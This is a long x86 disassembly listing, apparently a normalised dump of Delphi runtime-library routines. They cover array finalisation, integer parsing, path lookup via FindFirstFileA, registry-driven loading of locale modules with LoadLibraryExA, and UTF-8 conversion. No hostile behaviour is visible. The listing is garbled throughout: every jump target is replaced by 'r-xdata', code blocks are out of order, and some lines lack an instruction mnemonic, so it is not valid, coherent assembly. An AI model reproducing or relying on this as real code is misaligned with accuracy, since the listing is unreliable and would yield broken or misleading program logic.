mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a20
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4049d4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_40599c
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_4052f0
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_4028e8
sub_404b30
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_402988
mov edx [ eax + esi ]
add eax ebx
call sub_403fc0
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4046b4
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404b18
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_402988
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404c4c
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404b30
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4059b4
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_40532c
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_4028e8
sub_404c4c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403fc0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4046b4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404b18
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404c4c
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404b30
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4059b4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_40532c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_4028e8
sub_404d70
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_4047e4
mov edx eax
mov ecx esi
mov eax ebx
call sub_404d64
pop edx
pop esi
pop ebx
retn
sub_404d94
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_40422c
mov ecx eax
mov eax esp
mov edx ebx
call sub_4046d8
mov eax [ esp ]
pop edx
pop ebx
retn
sub_404dc0
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404de4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_4029c8
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_4029c8
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404dc0
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_405044
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40503c
jmp r-xdata
mov al 0x4
call sub_4028e8
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_4028e8
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4027cc
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_40278c
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402c30
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404a20
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_402988
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402c30
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_405024
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_405044
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4051dc
push ebx
test eax eax
je r-xdata
mov eax ecx
call sub_4052f0
pop ebx
retn
mov ebx eax
sub ebx 0x4
mov ebx [ ebx ]
push ebx
push ecx
xor ecx ecx
call sub_4051fc
pop ebx
retn
sub_4051fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_40503c
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
test edi edi
jge r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x4
mov eax [ eax ]
cmp eax edi
jge r-xdata
add esi edi
xor edi edi
mov edx eax
sub edx edi
cmp esi edx
jle r-xdata
mov edi eax
test esi esi
jge r-xdata
mov esi edx
test esi esi
jle r-xdata
xor esi esi
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x1 ]
add [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x2 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x6 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax esi
imul [ ebp - 0xc ]
add eax 0x8
call sub_40278c
mov ebx eax
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] esi
add ebx 0x4
imul edi [ ebp - 0xc ]
add [ ebp - 0x4 ] edi
test esi esi
jle r-xdata
mov ecx esi
imul ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_402988
mov edx esi
imul edx [ ebp - 0xc ]
mov eax ebx
xor ecx ecx
call sub_402c30
push esi
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_405024
jmp r-xdata
sub_4052f0
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4027ac
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404a20
sub_40532c
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_4052f0
pop edx
pop eax
sub_405354
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_40139c
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405384
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40132c
mov eax esp
mov dl 0x1
call sub_4055c0
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4053cc
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405384
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405408
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401334
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40133c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4053f4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4053f4
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4053f4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4055c0
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40132c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401384
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4056c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405408
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_40138c
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_401384
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_40137c
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_40138c
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401384
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40134c
push eax
call sub_401324
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405860
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4027ac
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4027ac
jmp r-xdata
sub_4058c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4058fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_40592c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405990
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4058c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405997
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4059b4
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4059e0
test edx edx
je sub_40599c
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_4028e8
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405aac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405b88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405cc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
